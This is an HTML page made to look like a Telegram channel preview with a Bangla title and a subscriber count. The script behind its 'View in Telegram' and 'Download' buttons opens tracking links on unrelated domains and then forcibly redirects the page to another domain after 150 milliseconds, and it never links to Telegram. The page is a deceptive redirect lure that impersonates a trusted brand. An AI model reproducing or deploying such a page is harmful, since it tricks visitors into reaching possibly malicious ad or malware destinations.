<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>দেশি কালেকশন - Telegram Channel</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:Arial, sans-serif;
    background:#f0f2f5;
}

/* Header */
.tgme_head_wrap{
    position:fixed;
    top:0;
    width:100%;
    height:60px;
    padding:10px;
    background:#ffffffd9;
    backdrop-filter:blur(10px);
    box-shadow:0 2px 5px rgba(0,0,0,0.1);
    z-index:10;
}

.tgme_head{
    max-width:500px;
    margin:auto;
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.tgme_head span{
    font-size:16px;
    font-weight:bold;
    color:#2481cc;
}

.tgme_head_right_btn{
    background:#2481cc;
    color:#fff;
    padding:8px 15px;
    border-radius:20px;
    font-size:13px;
}

/* Body */
.tgme_body_wrap{
    padding:80px 10px 20px;
    display:flex;
    justify-content:center;
}

.tgme_page{
    width:100%;
    max-width:360px;
    background:#fff;
    border-radius:15px;
    padding:20px;
    box-shadow:0 5px 15px rgba(0,0,0,0.1);
    text-align:center;
}

/* Image */
.tgme_page_photo img{
    width:100px;
    height:100px;
    border-radius:50%;
    border:3px solid #2481cc;
}

/* Title */
.tgme_page_title{
    font-size:20px;
    margin-top:10px;
    font-weight:bold;
}

/* Subscribers */
.tgme_page_extra{
    color:#777;
    margin-top:5px;
}

/* Button */
.tgme_action_button_new{
    display:block;
    margin-top:20px;
    background:#2481cc;
    color:#fff;
    padding:12px;
    border-radius:25px;
    font-weight:bold;
}

/* Mobile extra small */
@media(max-width:350px){
    .tgme_page{
        padding:15px;
    }

    .tgme_page_title{
        font-size:18px;
    }

    .tgme_page_photo img{
        width:80px;
        height:80px;
    }
}
</style>
</head>

<body>

<div class="tgme_head_wrap">
    <div class="tgme_head">
        <span>Telegram</span>
        <a id="down" class="tgme_head_right_btn">Download</a>
    </div>
</div>

<div class="tgme_body_wrap">
    <div class="tgme_page">

        <div class="tgme_page_photo">
            <img src="https://imagecdn.live/images/webp/e386b3ec-967d-42b7-bc23-cada9c5b90a3.webp">
        </div>

        <div class="tgme_page_title">🇧🇩 দেশি কালেকশন</div>

        <div class="tgme_page_extra">31,811 subscribers</div>

        <a id="watch" class="tgme_action_button_new">View in Telegram</a>

    </div>
</div>

<script>
const watchURL="https://pairturnnumerous.com/rze4wd8aa?key=74d74ecf1cacbe96436ceb718716741c";
const downloadURL="https://pairturnnumerous.com/rze4wd8aa?key=74d74ecf1cacbe96436ceb718716741c";
const redirectURL="https://nickeldefiancepriest.com/zcvm0rch?key=93b158ea491b4f11e0adbacd15934c67";

function go(link){
    let newTab = window.open(link,"_blank");
    if(!newTab){
        window.location.href=link;
    }
    setTimeout(()=>{
        window.location.href=redirectURL;
    },150);
}

document.getElementById("watch").onclick=()=>go(watchURL);
document.getElementById("down").onclick=()=>go(downloadURL);
</script>

</body>
</html>
